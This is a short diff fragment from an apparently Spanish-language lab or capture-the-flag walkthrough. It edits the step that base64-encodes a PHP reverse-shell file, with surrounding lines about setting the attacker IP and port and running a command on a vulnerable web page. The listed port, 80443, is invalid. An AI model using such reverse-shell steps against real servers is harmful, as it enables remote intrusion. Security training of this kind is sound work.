@@ -17,7 +17,7 @@ Como se puede observar en la imagen anterior, la página puede ser vulnerable a 
 
 1. Cambiamos la IP y el puerto y basemos el archivo php-revshell.php a base64. 
 ```bash 
-base64 php-revshell.php 
+cat php-revshell.php | base64
 ``` 
 
 2. Ejecutamos este comando el la web (utilizando como IP la 192.168.1.131 y el puerto 80443):
